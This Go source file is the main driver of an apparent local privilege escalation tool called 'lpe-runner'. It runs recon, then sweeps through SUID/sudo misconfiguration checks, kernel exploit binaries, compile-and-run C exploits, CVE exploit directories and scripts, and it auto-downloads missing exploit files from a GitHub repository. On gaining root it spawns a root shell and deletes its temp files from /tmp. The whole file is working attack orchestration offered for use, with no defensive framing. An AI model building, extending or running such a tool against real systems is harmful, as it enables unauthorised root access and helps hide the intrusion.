package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

// flags
var (
	flagList     = flag.Bool("list", false, "List all known exploits and exit")
	flagRecon    = flag.Bool("recon", false, "Run recon only and exit")
	flagOnly     = flag.String("only", "", "Run a single named exploit (case-insensitive)")
	flagNoStop   = flag.Bool("no-stop", false, "Keep running all exploits even after getting root")
	flagNoSpawn  = flag.Bool("no-spawn", false, "Detect root but do not drop into a shell")
	flagDry      = flag.Bool("dry", false, "Show what would run without executing")
	flagNoCf     = flag.Bool("no-copyfail", false, "Skip the copyfail pm.txt matrix")
	flagNoScript = flag.Bool("no-scripts", false, "Skip python/perl/bash script exploits")
	flagNoSrc    = flag.Bool("no-compile", false, "Skip .c compile-and-run exploits")
	flagNoDir    = flag.Bool("no-dirs", false, "Skip CVE directory exploits")
	flagOnlyKern = flag.Bool("kernel-filter", true, "Skip exploits whose kernel range does not match")
	flagVerbose  = flag.Bool("v", false, "Verbose: print child stdout/stderr too")
	flagRepo     = flag.String("repo", "", "GitHub raw base URL for auto-fetch (default: sagsooz/pa-root/main)")
	flagNoFetch  = flag.Bool("no-fetch", false, "Disable auto-download of missing exploit files")
)

func usage() {
	banner()
	fmt.Fprintln(os.Stderr, "Usage: lpe-runner [options]")
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "  -list               List all exploits and exit")
	fmt.Fprintln(os.Stderr, "  -recon              Recon only, then exit")
	fmt.Fprintln(os.Stderr, "  -only NAME          Run a single exploit by name")
	fmt.Fprintln(os.Stderr, "  -no-stop            Do not stop after first root")
	fmt.Fprintln(os.Stderr, "  -no-spawn           Do not spawn a shell when root is gained")
	fmt.Fprintln(os.Stderr, "  -no-copyfail        Skip the copyfail pm.txt matrix")
	fmt.Fprintln(os.Stderr, "  -no-scripts          Skip python/perl/bash scripts")
	fmt.Fprintln(os.Stderr, "  -no-compile         Skip .c compile-and-run exploits")
	fmt.Fprintln(os.Stderr, "  -no-dirs            Skip CVE directory exploits")
	fmt.Fprintln(os.Stderr, "  -kernel-filter=false  Run every exploit regardless of kernel range")
	fmt.Fprintln(os.Stderr, "  -dry                Show what would run, execute nothing")
	fmt.Fprintln(os.Stderr, "  -v                  Verbose (print child stdout/stderr)")
	fmt.Fprintln(os.Stderr, "  -repo URL           GitHub raw base for auto-fetch (default: sagsooz/pa-root/main)")
	fmt.Fprintln(os.Stderr, "  -no-fetch           Disable auto-download of missing exploit files")
	fmt.Fprintln(os.Stderr, "")
}

func main() {
	flag.Usage = usage
	flag.Parse()
	initColors()
	banner()
	fetchConfigure(*flagRepo, *flagNoFetch)

	if *flagList {
		listCmd()
		return
	}

	s := gatherRecon()
	s.print()

	if *flagRecon {
		return
	}

	// If we are already root, just say so and (optionally) spawn a shell.
	if os.Geteuid() == 0 {
		okf("Already root (euid=0).")
		if !*flagNoSpawn {
			rootspawn(&runResult{name: "already-root"})
		}
		return
	}

	stop := false

	// 1. Single-exploit mode.
	if *flagOnly != "" {
		runSingle(s, *flagOnly, &stop)
		finalize(s, &stop)
		return
	}

	// 2. Full sweep, ordered: scripts/SUID-style first (cheap, high-yield),
	//    then kernel binaries ordered by kernel fit, then compile, then dirs,
	//    then the copyfail matrix last (it is noisy).
	runFullSweep(s, &stop)
	finalize(s, &stop)
}

// runSingle launches one named exploit (case-insensitive substring match).
func runSingle(s *systemInfo, name string, stop *bool) {
	name = strings.ToLower(strings.TrimSpace(name))
	for _, e := range registry() {
		if strings.ToLower(e.Name) == name || strings.Contains(strings.ToLower(e.Name), name) {
			runOne(s, e, stop)
			return
		}
	}
	badf("no exploit named %q in catalog. Use -list.", name)
}

// runFullSweep iterates the catalog grouped by phase, stopping on root
// unless -no-stop was given.
func runFullSweep(s *systemInfo, stop *bool) {
	headf("Phase 1: SUID / sudo / misconfig (autoroot.pl)")
	if !*flagNoScript {
		runAutorootPhases(s, stop)
		if *stop {
			return
		}
	}

	headf("Phase 2: Kernel LPE static binaries")
	runBinaryExploits(s, stop)
	if *stop {
		return
	}

	if !*flagNoSrc {
		headf("Phase 3: Compile-and-run C sources")
		runCompileExploits(s, stop)
		if *stop {
			return
		}
	}

	if !*flagNoDir {
		headf("Phase 4: CVE directory exploits")
		runDirExploits(s, stop)
		if *stop {
			return
		}
	}

	if !*flagNoScript {
		headf("Phase 5: Python / Bash / Perl scripts")
		runScriptExploits(s, stop)
		if *stop {
			return
		}
	}

	if !*flagNoCf {
		runCopyfailMatrix(s, stop)
		if *stop {
			return
		}
	}
}

// runOne is the universal dispatcher for a single catalog entry.
func runOne(s *systemInfo, e Exploit, stop *bool) {
	if e.NoRoot {
		// autoroot.pl / reverse.pl etc. are interactive or unrelated; only
		// run them in single mode when explicitly asked.
		return
	}
	if !e.exists() {
		stepf("%-26s skip (file missing)", e.Name)
		return
	}
	if ok, why := e.eligible(s); !ok {
		if *flagOnlyKern && strings.Contains(why, "kernel") {
			stepf("%-26s skip (%s)", e.Name, why)
			return
		}
		if strings.Contains(why, "missing tools") {
			stepf("%-26s skip (%s)", e.Name, why)
			return
		}
	}
	if *flagDry {
		stepf("%-26s DRY  would run (%s)", e.Name, e.Desc)
		return
	}
	var r runResult
	switch e.Kind {
	case kindBinary:
		argv, _ := e.buildArgv()
		to := e.Timeout
		if to == 0 {
			to = defaultTimeout
		}
		r = runIsolated(e.Name, "", argv, durSec(to))
	case kindScript:
		argv, _ := e.buildArgv()
		to := e.Timeout
		if to == 0 {
			to = defaultTimeout
		}
		r = runIsolated(e.Name, "", argv, durSec(to))
	case kindCompile:
		r = compileAndRun(e, s)
	case kindDir:
		r = compileAndRun(e, s)
	case kindCopyfail:
		argv, _ := e.buildArgv()
		r = runIsolated(e.Name, "", argv, durSec(defaultTimeout))
	}
	r.name = e.Name
	r.report()
	if *flagVerbose {
		printChildOutput(&r)
	}
	if r.rootAfter || r.suidAfter {
		if !*flagNoSpawn {
			rootspawn(&r)
		}
		if !*flagNoStop {
			*stop = true
		}
	}
}

func runBinaryExploits(s *systemInfo, stop *bool) {
	var bin []Exploit
	for _, e := range registry() {
		if e.Kind == kindBinary && !e.NoRoot {
			bin = append(bin, e)
		}
	}
	// Order: eligible-by-kernel first, then the rest alphabetically. Within
	// the eligible group, narrower kernel ranges first (more likely to land).
	sort.SliceStable(bin, func(i, j int) bool {
		ei, _ := bin[i].eligible(s)
		ej, _ := bin[j].eligible(s)
		if ei != ej {
			return ei
		}
		return bin[i].Name < bin[j].Name
	})
	for _, e := range bin {
		if *stop {
			return
		}
		runOne(s, e, stop)
	}
}

func runCompileExploits(s *systemInfo, stop *bool) {
	for _, e := range registry() {
		if *stop {
			return
		}
		if e.Kind == kindCompile {
			runOne(s, e, stop)
		}
	}
}

func runDirExploits(s *systemInfo, stop *bool) {
	for _, e := range registry() {
		if *stop {
			return
		}
		if e.Kind == kindDir {
			runOne(s, e, stop)
		}
	}
}

func runScriptExploits(s *systemInfo, stop *bool) {
	for _, e := range registry() {
		if *stop {
			return
		}
		if e.Kind == kindScript && !e.NoRoot {
			runOne(s, e, stop)
		}
	}
}

// runAutorootPhases delegates the SUID/sudo/passwd/pwnkit misconfig sweep to
// autoroot.pl if it is present; otherwise we skip (the static pwnkit-new-static
// etc. cover most of this anyway). autoroot.pl is itself crash-prone on some
// systems, so we run it isolated too.
func runAutorootPhases(s *systemInfo, stop *bool) {
	src := absBin("autoroot.pl")
	if !hasFile(src) || !s.hasPerl {
		stepf("autoroot.pl not available — skipping interactive misconfig phase")
		return
	}
	infof("Running autoroot.pl (isolated) for SUID/sudo/passwd sweep")
	r := runIsolated("autoroot.pl", "", []string{"perl", src}, 120*time.Second)
	r.report()
	if *flagVerbose {
		printChildOutput(&r)
	}
	if r.rootAfter || r.suidAfter {
		if !*flagNoSpawn {
			rootspawn(&r)
		}
		if !*flagNoStop {
			*stop = true
		}
	}
}

// printChildOutput dumps stdout/stderr of a finished exploit for debugging.
func printChildOutput(r *runResult) {
	if r.stdout != "" {
		fmt.Printf("%s  stdout:%s\n", colD, colZ)
		for _, line := range strings.Split(strings.TrimSpace(r.stdout), "\n") {
			if line != "" {
				fmt.Printf("%s    %s%s\n", colD, line, colZ)
			}
		}
	}
	if r.stderr != "" {
		fmt.Printf("%s  stderr:%s\n", colD, colZ)
		for _, line := range strings.Split(strings.TrimSpace(r.stderr), "\n") {
			if line != "" {
				fmt.Printf("%s    %s%s\n", colD, line, colZ)
			}
		}
	}
}

// finalize prints the summary and, if root was gained and spawning is
// allowed but hasn't happened yet, spawns the shell.
func finalize(s *systemInfo, stop *bool) {
	fmt.Println()
	if *stop || isRootNow() || isSUIDBash() {
		okf("Root was achieved. Cleaning up temp artifacts.")
		cleanupTemp()
		if !*flagNoSpawn && (isSUIDBash() || isRootNow()) {
			rootspawn(&runResult{name: "finalize"})
		} else {
			okf("Shell spawn skipped (-no-spawn or already returned).")
			if isSUIDBash() {
				path := "/bin/bash"
				if isSUIDFile("/tmp/.sb") {
					path = "/tmp/.sb"
				}
				okf("Run this to get a root shell: %s -p", path)
			}
		}
		return
	}
	badf("No exploit succeeded.")
	warnf("Try: -kernel-filter=false  to brute-force all entries, or  -only NAME")
}

// cleanupTemp removes runner-generated temp files.
func cleanupTemp() {
	for _, p := range []string{"/tmp/.lpe_rooted", "/tmp/.lpe_suid_bash"} {
		_ = os.Remove(p)
	}
	entries, _ := os.ReadDir("/tmp")
	for _, ent := range entries {
		if strings.HasPrefix(ent.Name(), ".lpe_") || strings.HasPrefix(ent.Name(), ".cf_") {
			_ = os.Remove(filepath.Join("/tmp", ent.Name()))
		}
	}
}
